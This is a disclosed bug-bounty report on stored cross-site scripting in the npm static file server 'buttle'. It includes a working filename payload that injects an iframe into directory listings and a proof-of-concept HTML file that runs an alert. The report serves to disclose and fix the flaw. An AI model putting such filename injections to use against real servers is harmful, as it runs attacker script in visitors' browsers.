# [buttle] HTML Injection in filename leads to XSS when directory listing is displayed in the browser

## Report Details
- **Report ID**: 331110
- **URL**: https://hackerone.com/reports/331110
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-03-29T14:49:58.414Z
- **Disclosed**: 2018-07-04T19:24:02.294Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report HTML Injection in buttle module.

Due to lack of filenames sanitization, it is possible to inject malicious ```iframe``` tag via filename and execute arbitray JavaScript code.

# Module

**module name:** buttle
**version:** 0.2.0
**npm page:** https://www.npmjs.com/package/buttle

## Module Description

Simple static file (+ markdown) server.


## Module Stats

Stats:

N/A, estimated ~20-40 downloads/week

# Vulnerability

## Vulnerability Description

When ```buttle``` displays directory index in the browser, it uses ```directory.js``` middleware from ```connect``` module to create an output with HTML. Because methods to escape user output used in this middleware are not sufficient enough (it's actually quite outdated version of ```connect```), it is possible to inject ```iframe``` tag with ```src``` attribute set to arbitrary HTML file, which can contain any executable JavaScript code.

## Steps To Reproduce:

- install ```buttle```:

```
$ npm i buttle
```

- create file with the following name: ```"><iframe src="malware_frame.html">```

- create ```malwrae_frame.html``` file with following content:

```html
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>
    <!-- <script type="text/javascript" src="malware.js"></script> -->
    <script>
        alert('Uh oh, I am bad, bad malware!!!')
    </script>
</body>

</html>
```

- run buttle:

```
$ ./node_modules/buttle/bin/buttle -p 8080
Listening on port 8080
```

- in browser, open the following url:

```
http://localhost:8080
```

You see JavaScript from ```malware_frame.html``` executed immediately:

{F279830}


## Patch

Probably updating all dependiences is a good solution.


## Supporting Material/References:


- Operating system: Ubuntu 16.04
- Node.js 8.9.4
- npm v. 5.6.0
- Chromium Version 67.0.3367.0 (Developer Build) (64-bit)


# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 

I hope my report will help to keep Node.js ecosystem and its users safe :)

Regards,

Rafal 'bl4de' Janicki

## Impact

An attacker is able to execute arbitrary JavaScript code in user's browser

The hacker selected the **Cross-site Scripting (XSS) - Stored** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**URL**
http://localhost:8080

**Verified**
Yes



## Attachments
- 1.jpg
